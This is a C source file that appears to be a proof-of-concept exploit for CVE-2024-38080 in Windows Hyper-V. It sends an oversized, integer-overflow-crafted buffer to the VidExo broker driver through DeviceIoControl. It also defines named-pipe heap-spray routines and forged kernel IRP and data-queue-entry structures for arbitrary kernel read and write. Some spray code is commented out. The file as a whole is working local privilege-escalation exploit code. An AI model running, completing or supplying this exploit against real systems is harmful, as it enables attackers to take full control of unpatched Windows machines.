#include <stdio.h>
#include <Windows.h>
#include <WinHvPlatform.h>
#include "LPE.h"

#define SPRAY_SIZE 0x10000
#define HOLE_COUNT 0x100

#define FAKE_DQE 0x80918

#define SEND_IOCTL 0x221288
//VidExoBrokerIoctlSend

#define RECV_IOCTL 0x22128c
//VidExoBrokerIoctlReceive

#define INPUT_LEN 0xffffffff
#define ENTRY_DATASIZE(x) ((x) - 0x30)
#define FIRST_ENTRY_SIZE 0x40
#define SECOND_ENTRY_SIZE 0x10

typedef struct _BrokerIrpDataHeader {
	DWORD HeaderSize;
	DWORD NumHandles;
	DWORD DataOffset;
	DWORD DataLen;
}BrokerIrpDataHeader;
#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		LONG Status;                                                        //0x0
		VOID* Pointer;                                                      //0x0
	};
	ULONGLONG Information;                                                  //0x8
}IO_STATUS_BLOCK;

typedef void (IO_APC_ROUTINE)(
	void* ApcContext,
	IO_STATUS_BLOCK* IoStatusBlock,
	unsigned long    reserved
	);

typedef int(__stdcall* NTFSCONTROLFILE)(
	HANDLE           fileHandle,
	HANDLE           event,
	IO_APC_ROUTINE* apcRoutine,
	void* ApcContext,
	IO_STATUS_BLOCK* ioStatusBlock,
	unsigned long    FsControlCode,
	void* InputBuffer,
	unsigned long    InputBufferLength,
	void* OutputBuffer,
	unsigned long    OutputBufferLength
	);

typedef struct {
	SHORT Type;
	USHORT Size;
	PVOID MdlAddress;
	ULONG Flags;
	PVOID AssociatedIrp;
	LIST_ENTRY ThreadListEntry;
	IO_STATUS_BLOCK IoStatus;
	CHAR RequestorMode;
	BOOLEAN PendingReturned;
	CHAR StackCount;
	CHAR CurrentLocation;
	BOOLEAN Cancel;
	UCHAR CancelIrql;
	CCHAR ApcEnvironment;
	UCHAR AllocationFlags;
	PVOID UserIosb;
	PVOID UserEvent;
	char Overlay[16];
	PVOID CancelRoutine;
	PVOID UserBuffer;
	CHAR TailIsWrong;
} IRP;

typedef struct {
	DWORD64 Flink;
	DWORD64 Blink;
	IRP* Irp;
	DWORD SecurityContext;
	DWORD EntryType;
	DWORD QuotaInEntry;
	DWORD DataSize;
	DWORD x;
} DATA_QUEUE_ENTRY;

typedef struct {
	HANDLE r;
	HANDLE w;
} PIPE_HANDLES;

HANDLE VidExo;
DWORD64* payload;
PIPE_HANDLES spray[SPRAY_SIZE];
PIPE_HANDLES victim;


void PreparePipe(PIPE_HANDLES* ph, DWORD quota) {
	ph->w = CreateNamedPipeW(
		L"\\\\.\\pipe\\CVE-2024-38080",
		PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		quota,
		quota,
		0,
		0);
	ph->r = CreateFile(L"\\\\.\\pipe\\CVE-2024-38080", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
}

void WriteDataEntry(PIPE_HANDLES ph, char* buf,DWORD len) {
	WriteFile(ph.w,
		buf,
		len,
		NULL,
		NULL);
}

void ReadDataEntry(PIPE_HANDLES ph, char* buf, DWORD len) {
	ReadFile(ph.r,
		buf,
		len,
		NULL,
		NULL);
}

void PrepareDataEntryForRead(DATA_QUEUE_ENTRY* dqe, IRP* irp, DWORD64 read_address) {
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->EntryType = 1;
    dqe->DataSize = -1;
    dqe->Irp = irp;
    irp->AssociatedIrp = (PVOID)read_address;
}

void PrepareWriteIRP(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address) {
    irp->Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
    irp->AssociatedIrp = source_address;
    irp->UserBuffer = destination_address;
    irp->ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);
    irp->ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);
}

void PrepareDataEntryForWrite(DATA_QUEUE_ENTRY* dqe, IRP* irp, DWORD64 size) {
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->Flink = (DWORD64)dqe;
    dqe->EntryType = 0;
    dqe->QuotaInEntry = size - 1;
    dqe->DataSize = size;
    dqe->Irp = irp;
}

VOID Spray() {
	/*
	printf("[!] Spray 0x%llx DATA_QUEUE_ENTRY\n", SPRAY_SIZE);
	char buf[0x40];
	memset(buf, 0x41, 0x40);
	for (DWORD i = 0; i < SPRAY_SIZE;i++) {
		PreparePipe(&spray[i], FIRST_ENTRY_SIZE + SECOND_ENTRY_SIZE);
	}

	for (DWORD i = 0; i < SPRAY_SIZE;i++) {
		WriteDataEntry(spray[i], buf, FIRST_ENTRY_SIZE);
	}
	memset(buf, 0x42, 0x40);

	for (DWORD i = 0; i < SPRAY_SIZE;i++) {
		if (i % 0x20 != 0)
			WriteDataEntry(spray[i], buf, SECOND_ENTRY_SIZE);//cover entries
	}
	*/
}

VOID CreateHole() {
	printf("[!] Create Holes\n");
	/*
	char buf[0x40];
	for (DWORD i = SPRAY_SIZE - 0x1000, cnt = 0; i < SPRAY_SIZE; i += 0x20) {
		ReadDataEntry(spray[i], buf, 0x40);//freeing entries
		if (++cnt > HOLE_COUNT) break;
	}
	*/
}

DWORD WINAPI Receive() {
	Sleep(2500);
	Spray();
	CreateHole();
	if (!DeviceIoControl(VidExo, RECV_IOCTL, NULL, 0, payload, 0x30, NULL, NULL)) {
		printf("RECV_IOCTL failed(%x)\n", GetLastError());
	}
	Sleep(INFINITE);
}

int
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	unsigned int size, val;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &cap, sizeof(cap), &size);

	if (cap.HypervisorPresent == 0)
	{
		printf("Hypervisor is not present\n");
		return -1;
	}

	WHvCreatePartition(&prtn);

	val = 1;//processor cnt
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &val, sizeof(val));

	WHvSetupPartition(prtn);

	VidExo = (HANDLE)(*((__int64*)prtn + 1) & 0xfffffffffffffffe);

	DWORD NumHandles, DataLen;
	DataLen = 0x80000000;
	NumHandles = (0x100000000 - 0x10 - DataLen) / sizeof(HANDLE);

	printf("DataLen: %x\nNumHandles: %x\n", DataLen, NumHandles);

	payload = VirtualAlloc(
		NULL,
		INPUT_LEN,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);

	if (payload == NULL) {
		printf("VirtualAlloc Failed(%x)\n", GetLastError());
		printf("[?] Program Base: %p\n", &VidExo);
		goto CLEAN;
	}
	else {//DEBUG
		printf("[?] VirtuaAlloc: %p\n", payload);
		printf("[?] Program Base: %p\n", &VidExo);
	}

	BrokerIrpDataHeader* hdr = payload;
	HANDLE proc = GetCurrentProcess();
	PHANDLE p = &hdr[1];

	hdr->HeaderSize = 0x10;
	hdr->NumHandles = NumHandles;
	hdr->DataLen = DataLen;
	hdr->DataOffset = 0x10 + sizeof(HANDLE) * NumHandles - 0x20;

	if (
		(INPUT_LEN < hdr->HeaderSize)
		|| (INPUT_LEN - hdr->HeaderSize) >> 3 < hdr->NumHandles
		|| INPUT_LEN < hdr->DataOffset
		|| INPUT_LEN - hdr->DataOffset < hdr->DataLen) {
		printf("No way...\n");
		goto CLEAN;
	}


	for (DWORD i = 0; i < hdr->DataLen; i += 8) {
		payload[ (i + hdr->DataOffset) / 8 ] = 0x4141414141414141 + i;
	}

	for (DWORD i = 0; i < NumHandles; i++) {
		*p = proc;
		p++;
	}



	p = &hdr[1];
	p[0x50/8] = 0x4141414141414141;

	CreateThread(
		NULL,
		0,
		Receive,
		NULL,
		0,
		NULL
	);

	printf("VidExoBrokerIoctlSend\n");
	if (!DeviceIoControl(VidExo, SEND_IOCTL, payload, INPUT_LEN, NULL, 0, NULL, NULL)) {
		printf("DeviceIoControl(SEND_IOCTL) Failed(%x)\n", GetLastError());
		goto CLEAN;
	}


CLEAN:
	VirtualFree(payload, INPUT_LEN, MEM_FREE);
	VirtualFree(payload, 0, MEM_RELEASE);
	WHvDeletePartition(prtn);
}